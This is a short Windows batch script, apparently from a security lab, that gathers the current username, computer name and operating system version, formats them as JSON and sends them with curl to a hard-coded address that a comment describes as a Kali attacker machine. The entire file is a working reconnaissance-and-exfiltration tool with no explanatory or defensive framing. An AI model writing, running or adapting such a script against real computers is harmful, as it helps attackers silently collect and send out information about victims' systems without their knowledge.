@echo off
:: Collect system information
set USERNAME=%USERNAME%
set COMPUTERNAME=%COMPUTERNAME%

:: Get additional system details
for /f "tokens=*" %%A in ('wmic os get Caption^,Version /value ^| find "="') do set %%A

:: Escape special characters for JSON formatting
set USERNAME_ESCAPED=%USERNAME:"=\"%
set COMPUTERNAME_ESCAPED=%COMPUTERNAME:"=\"%
set OS_ESCAPED=%Caption:"=\"% %Version:"=\"%

:: Create the JSON payload
set JSON_PAYLOAD={\^"username\^":\^"%USERNAME_ESCAPED%\^",\^"computername\^":\^"%COMPUTERNAME_ESCAPED%\^",\^"os\^":\^"%OS_ESCAPED%\^"}

:: Debug: Print the JSON payload
@REM echo %JSON_PAYLOAD%
@REM echo JSON Payload: %JSON_PAYLOAD%

:: Send the JSON data to the server (Kali IP address, adjust if necessary)
curl -X POST -H "Content-Type: application/json" -d "%JSON_PAYLOAD%" http://192.168.0.141:8080/info

@REM pause
